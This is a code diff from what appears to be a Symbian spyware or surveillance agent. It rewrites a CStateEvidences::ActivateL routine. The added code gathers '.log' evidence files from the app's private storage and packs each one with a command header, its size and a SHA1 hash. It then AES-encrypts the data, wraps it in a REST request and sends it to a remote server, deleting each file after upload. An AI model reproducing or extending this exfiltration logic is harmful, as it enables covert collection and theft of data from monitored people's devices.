@@ -49,6 +49,7 @@ void CStateEvidences::ConstructL()
 	User::LeaveIfError(iFs.Connect());
 	}
 
+/*
 void CStateEvidences::ActivateL(const TDesC8& aData)
 	{
 	iSignKey.Copy(aData);
@@ -156,6 +157,87 @@ void CStateEvidences::ActivateL(const TDesC8& aData)
 		iObserver.ReConnect();
 		}
 	}
+*/
+
+void CStateEvidences::ActivateL(const TDesC8& aData)
+	{
+	iSignKey.Copy(aData);
+	
+	if (iState != EInitState)
+		{
+		// Log File has been sent. 
+		// Delete the LogFile and remove it from the array
+		HBufC* fileName = iFileList[0];
+		iFs.Delete(*fileName);
+		delete fileName;
+		iFileList.Remove(0);
+		}
+	else
+		{
+		//this is the first run
+		TFullName path;
+		FileUtils::CompleteWithPrivatePathL(iFs, path);
+		path.Append(_L("*.log"));
+		FileUtils::ListFilesInDirectoryL(iFs, path, iFileList);
+		
+		iState = ESendLogData;
+		}
+	// Check if there exists log files...
+	if (iFileList.Count() == 0)
+		{
+		iObserver.ChangeStateL();
+		return;
+		}
+	//send evidence
+	//here we are sure we don't need anymore the answer
+	delete iResponseData;
+	iResponseData = NULL;
+	
+	CBufBase* buffer = CBufFlat::NewL(10);
+	CleanupStack::PushL(buffer);
+	//append command
+	buffer->InsertL(buffer->Size(),(TUint8 *)KProto_Log().Ptr(),KProto_Log().Size());
+	//append size
+	HBufC* fileName = iFileList[0];
+	TUint32 fileSize = FileUtils::GetFileSize(iFs, *fileName);
+	buffer->InsertL(buffer->Size(),&fileSize,sizeof(fileSize));
+	HBufC8* plainBody = buffer->Ptr(0).AllocL();
+	CleanupStack::PopAndDestroy(buffer);
+	TInt plainBodySize = plainBody->Size();
+	plainBody = plainBody->ReAllocL(plainBodySize+fileSize+20); //20=sha
+	//append file
+	RBuf8 fileBuf(FileUtils::ReadFileContentsL(iFs, *fileName));
+	fileBuf.CleanupClosePushL();
+	plainBody->Des().Append(fileBuf);
+	CleanupStack::PopAndDestroy(&fileBuf);
+	// calculate SHA1
+	TBuf8<20> sha;
+	ShaUtils::CreateSha(*plainBody,sha);
+	//append SHA1
+	plainBody->Des().Append(sha);
+					
+	// encrypt an send
+	RBuf8 buff(AES::EncryptPkcs5L(*plainBody, KIV, iSignKey));
+	buff.CleanupClosePushL();
+	delete plainBody;
+	//add REST header
+	HBufC8* header = iObserver.GetRequestHeaderL();
+	TBuf8<32> contentLengthLine;
+	contentLengthLine.Append(KContentLength);
+	contentLengthLine.AppendNum(buff.Size());
+	contentLengthLine.Append(KNewLine);
+	delete iRequestData;  
+	iRequestData = NULL;
+	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
+	iRequestData->Des().Append(*header);
+	delete header;
+	iRequestData->Des().Append(contentLengthLine);
+	iRequestData->Des().Append(KNewLine);
+	iRequestData->Des().Append(buff);
+	CleanupStack::PopAndDestroy(&buff);
+	iObserver.SendStateDataL(*iRequestData);
+	}
+
 
 
 void CStateEvidences::ProcessDataL(const TDesC8& aData)
